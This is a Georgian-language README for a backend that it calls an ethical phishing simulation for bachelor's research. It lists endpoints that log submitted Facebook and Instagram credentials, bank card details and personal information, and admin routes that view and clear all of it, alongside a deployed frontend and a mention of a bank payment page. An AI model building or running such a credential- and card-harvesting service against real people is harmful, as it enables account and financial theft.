# sabak-backend

საბაკალავრო კვლევის ეთიკური ფიშინგ სიმულაციის backend API.

## ტექნოლოგიები

- ASP.NET Core 8
- PostgreSQL (Npgsql / Entity Framework Core)
- Railway — Cloud Deployment
- Swagger / OpenAPI

## API Endpoints

| Method | Endpoint | აღწერა |
|--------|----------|--------|
| POST | `/api/log` | Credentials-ის ჩაწერა (FB / IG) |
| POST | `/api/log/card` | საბანკო ბარათის ჩაწერა |
| POST | `/api/log/pinfo` | პირადი ინფოს ჩაწერა |
| GET | `/api/log/admin` | ყველა ჩანაწერის ნახვა |
| DELETE | `/api/log/admin/clear` | ყველა ჩანაწერის გასუფთავება |

## Frontend

[sabak-frontend](https://github.com/lashaghongha1/sabak-frontend) — Vercel-ზე დეპლოიდებული: [techop.vercel.app](https://techop.vercel.app)

---

## განვითარების ისტორია

| თარიღი | ავტორი | გაკეთებული |
|--------|--------|------------|
| 2025 წ. 15 იან. | ლაშა ღონღაძე | პროექტის სტრუქტურა, ASP.NET Core 8 setup |
| 2025 წ. 21 იან. | ლაშა ღონღაძე | PostgreSQL კავშირი, Entity Framework მიგრაცია |
| 2025 წ. 28 იან. | ლაშა ღონღაძე | Log endpoints — credentials, card, personal info |
| 2025 წ. 4 თებ. | ლაშა ღონღაძე | Admin API — GET ყველა ჩანაწერი |
| 2025 წ. 9 თებ. | ლაშა ღონღაძე | CORS კონფიგურაცია, Railway deployment |
| 2025 წ. 14 თებ. | ლაშა ღონღაძე | Dockerfile, railway.toml, Cloud deploy |
| 2025 წ. 20 თებ. | ლაშა ღონღაძე | DELETE /admin/clear endpoint |

## ავტორი

**ლაშა ღონღაძე** — Backend განვითარება, Cloud Deployment, Admin Panel, BOG გადახდის გვერდი
